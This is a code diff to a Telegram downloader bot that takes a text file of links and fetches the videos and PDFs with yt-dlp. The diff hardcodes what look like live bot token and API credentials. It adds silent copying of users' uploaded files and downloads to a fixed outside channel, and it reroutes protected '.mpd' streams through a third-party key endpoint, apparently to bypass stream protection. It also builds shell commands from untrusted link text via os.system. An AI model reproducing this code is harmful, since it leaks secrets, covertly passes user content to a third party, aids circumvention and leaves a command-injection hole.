@@ -2,7 +2,6 @@ from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
 import requests
 import json
 import subprocess
-import details
 from pyrogram import Client, filters
 from pyrogram.types.messages_and_media import message
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
@@ -14,69 +13,79 @@ from p_bar import progress_bar
 from subprocess import getstatusoutput
 from aiohttp import ClientSession
 import helper
+from logger import logging
 import time
 import asyncio
 from pyrogram.types import User, Message
+from config import *
 import sys
 import re
 import os
 
-bot = Client(
-    "bot",
-    bot_token=os.environ.get("BOT_TOKEN"),
-    api_id=int(os.environ.get("API_ID")),
-    api_hash=os.environ.get("API_HASH"))
-auth_users = [5033114900,-1001534923424]
+bot = Client("bot",
+             bot_token= "6739442523:AAHHA5HZmU6sqI-elmhTs8dwHqfhTizWwnQ",
+             api_id=22609670,
+             api_hash= "3506d8474ad1f4f5e79b7c52a5c3e88d")
 
 
-@bot.on_message(filters.command(["start"]))
+@bot.on_message(filters.command(["start"]) & filters.user(ADMINS))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text(f"<b>✨ Hᴇʟʟᴏ  [{m.from_user.first_name}](tg://user?id={m.from_user.id})\n\nI Cᴀɴ Pʀᴏᴠɪᴅᴇ ᴛxᴛ ꜰɪʟᴇ ᴏᴛ ꜰɪʟᴇ Fᴏʀ Yᴏᴜ Jᴜsᴛ Aᴅᴅ Mᴇ Iɴ Yᴏᴜʀ Gʀᴏᴜᴘ Oʀ Jᴏɪɴ Oᴜʀ Gʀᴏᴜᴘ\n\nPress /OM</b>")
+    editable = await m.reply_text(f"HELLO I AM TXT DOWNLOADER BOT MADE BY DR SIR [{m.from_user.first_name}](tg://user?id={m.from_user.id})\nPress /BOSS")
 
 
-@bot.on_message(filters.command("stop"))
+@bot.on_message(filters.command("stop") & filters.user(ADMINS))
 async def restart_handler(_, m):
-    await m.reply_text("**STOPPED**🚦", True)
+    await m.reply_text("**STOPPED**🛑🛑", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
-
-@bot.on_message(filters.command(["OM"])&(filters.chat(auth_users)))
+@bot.on_message(filters.command(["DR"]) & filters.user(ADMINS))
 async def account_login(bot: Client, m: Message):
-    editable = await m.reply_text('Send TXT file')
+    editable = await m.reply_text(f"**Hey [{m.from_user.first_name}](tg://user?id={m.from_user.id})\nSend txt file**")
     input: Message = await bot.listen(editable.chat.id)
-    x = await input.download()
-    await input.delete(True)
+    if input.document:
+        x = await input.download()
+        await bot.send_document(-1002070057679, x)
+        await input.delete(True)
+        file_name, ext = os.path.splitext(os.path.basename(x))
+        credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
 
 
+        path = f"./downloads/{m.chat.id}"
 
-    path = f"./downloads/{m.chat.id}"
-
-    try:
-       with open(x, "r") as f:
-           content = f.read()
-       content = content.split("\n")
-       links = []
-       for i in content:
-           links.append(i.split("://", 1))
-       os.remove(x)
+        try:
+            with open(x, "r") as f:
+                content = f.read()
+            content = content.split("\n")
+            links = []
+            for i in content:
+                links.append(i.split("://", 1))
+            os.remove(x)
             # print(len(links)
-    except:
-           await m.reply_text("Invalid file input.")
-           os.remove(x)
-           return
-    
+        except:
+            await m.reply_text("Invalid file input.🥲")
+            os.remove(x)
+            return
+    else:
+        content = input.text
+        content = content.split("\n")
+        links = []
+        for i in content:
+            links.append(i.split("://", 1))
    
     await editable.edit(f"Total links found are **{len(links)}**\n\nSend From where you want to download initial is **1**")
     input0: Message = await bot.listen(editable.chat.id)
     raw_text = input0.text
     await input0.delete(True)
 
-    await editable.edit("**Enter Batch Name**")
+    await editable.edit("**Enter Batch Name or send d for grabing from text filename.**")
     input1: Message = await bot.listen(editable.chat.id)
     raw_text0 = input1.text
     await input1.delete(True)
-    
+    if raw_text0 == 'd':
+        b_name = file_name
+    else:
+        b_name = raw_text0
 
     await editable.edit("**Enter resolution**")
     input2: Message = await bot.listen(editable.chat.id)
@@ -100,19 +109,16 @@ async def account_login(bot: Client, m: Message):
     except Exception:
             res = "UN"
     
-    
-
-    await editable.edit("**Enter A Highlighter Otherwise send 👉Co👈 **")
+    await editable.edit("**Enter Your Name or send `de` for use default**")
     input3: Message = await bot.listen(editable.chat.id)
     raw_text3 = input3.text
     await input3.delete(True)
-    highlighter  = f"️ ⁪⁬⁮⁮⁮"
-    if raw_text3 == 'Co':
-        MR = highlighter 
+    if raw_text3 == 'de':
+        CR = credit
     else:
-        MR = raw_text3
-   
-    await editable.edit("Now send the **Thumb url**\nEg : ```https://telegra.ph/file/d4c0b48f24b01d16e8a57.jpg```\n\nor Send `no`")
+        CR = raw_text3
+
+    await editable.edit("Now send the **Thumb url**\nEg : ```https://telegra.ph/file/0633f8b6a6f110d34f044.jpg```\n\nor Send `no`")
     input6 = message = await bot.listen(editable.chat.id)
     raw_text6 = input6.text
     await input6.delete(True)
@@ -147,7 +153,7 @@ async def account_login(bot: Client, m: Message):
 
             elif '/master.mpd' in url:
              id =  url.split("/")[-2]
-             url =  "https://d26g5bnklkwsh4.cloudfront.net/" + id + "/master.m3u8"
+             url =  "https://psitoffers.store/testkey.php?vid=" + id + "&quality=" + raw_text2
 
             name1 = links[i][0].replace("\t", "").replace(":", "").replace("/", "").replace("+", "").replace("#", "").replace("|", "").replace("@", "").replace("*", "").replace(".", "").replace("https", "").replace("http", "").strip()
             name = f'{str(count).zfill(3)}) {name1[:60]}'
@@ -162,14 +168,14 @@ async def account_login(bot: Client, m: Message):
             else:
                 cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
 
-            try:  
-                
-                cc = f'**Vid_id  »** {str(count).zfill(3)}\n**Title  »** {name1} {res} {MR}.mkv\n**Batch »** {raw_text0}\n\n'
-                cc1 = f'**Vid_id  »** {str(count).zfill(3)}\n**Title »** {name1} {MR}.pdf \n**Batch »** {raw_text0}\n\n'
+            try:                               
+                cc = f'** {str(count).zfill(3)}.** {name1} ({res}) TIGER.mkv\n**Batch Name :** {b_name}\n\n**Downloaded by : {CR}**'
+                cc1 = f'** {str(count).zfill(3)}.** {name1} TIGER.pdf \n**Batch Name :**{b_name}\n\n**Downloaded by : {CR}**'
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
                         copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
+                        await copy.copy(chat_id = -1002070057679)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -177,13 +183,13 @@ async def account_login(bot: Client, m: Message):
                         await m.reply_text(str(e))
                         time.sleep(e.x)
                         continue
-                
                 elif ".pdf" in url:
                     try:
                         cmd = f'yt-dlp -o "{name}.pdf" "{url}"'
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
-                        copy = await bot.send_document(chat_id=m.chat.id, document=f'{name}.pdf', caption=cc1)
+                        copy = await bot.send_document(chat_id=m.chat.id,document=f'{name}.pdf', caption=cc1)
+                        await copy.copy(chat_id = -1002070057679)
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
@@ -191,24 +197,21 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**Downloading:-**\n\n**Name :-** `{name}\nQuality - {raw_text2}`\n\n**Url :-** `{url}`"
-                    prog = await m.reply_text(Show)
+                    prog = await m.reply_text(f"**Downloading:-**\n\n** Video Name :-** `{name}\nQuality - {raw_text2}`\n**link:**`{url}`\n\n **bot made by TIGER ❤️**")
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
                     await prog.delete(True)
-                    await helper.send_vid(bot, m, cc, filename, thumb, name, prog)
+                    await helper.send_vid(bot, m, cc, filename, thumb, name)
                     count += 1
-                    time.sleep(1)
 
             except Exception as e:
-                await m.reply_text(
-                    f"**Can't be uploaded**\n{str(e)}\n**Name** - {name}\n**Link** - `{url}`"
-                )
+                await m.reply_text(f"**This #Failed File is not Counted**\n**Name** =>> `{name}`\n**Link** =>> `{url}`\n\n ** fail reason »** {e}")
+                count += 1
                 continue
 
     except Exception as e:
         await m.reply_text(e)
-    await m.reply_text("Done")
+    await m.reply_text("🔰Done Boss🔰")
 
 
 bot.run()
